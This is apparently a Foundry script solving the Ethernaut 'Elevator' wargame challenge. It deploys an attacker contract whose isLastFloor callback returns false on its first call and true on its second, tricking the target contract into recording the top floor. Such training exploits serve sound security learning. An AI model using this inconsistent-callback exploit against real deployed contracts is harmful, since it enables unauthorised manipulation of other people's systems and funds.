// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Elevator.sol";

contract Attacker {
    Elevator elevator = Elevator(0x7D67D4cc650CE6dd92c00e07f8b25c014DC02e88);
    uint256 public counter = 0;

    constructor() {}

    /**
     * @notice Attempts to go to a specific floor in the Elevator contract.
     * @param _floor The floor number to go to.
     */
    function goToLastFloor(uint256 _floor) external {
        elevator.goTo(_floor);
    } 

    /**
     * @notice The method that determines if we are on the last floor.
     *         It is called twice, returning `false` on the first call and `true` on the second.
     * @return A boolean indicating whether it's the last floor.
     */
    function isLastFloor(uint256) external returns (bool) {
        counter++;
        return counter > 1 ? true : false;
    }
}

/// @author agadzhalov
/// @title Solution to Elevator Ethernaut challenge
/// @notice Solution:
///         1. Deploy a contract that implements the `isLastFloor` method.
///         2. The `isLastFloor` method increments a counter and ensures that the first call returns `false` and the second `true`.
///         3. This trick causes the `Elevator` contract to think we are on the last floor, allowing us to call `goTo` with the last floor.
contract ElevatorScript is Script {
    /// @notice Instance of the `Elevator` contract to interact with.
    Elevator public elevator = Elevator(0x7D67D4cc650CE6dd92c00e07f8b25c014DC02e88);
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the attacker contract and perform the attack
        Attacker attacker = new Attacker();

        // Log the current top floor before the attack
        console.log("1. Is top", elevator.top());

        // Attacker triggers going to the last floor
        attacker.goToLastFloor(1);

        // Log the top floor after the attack
        console.log("2. Is top", elevator.top());
       
        vm.stopBroadcast();

    }
}
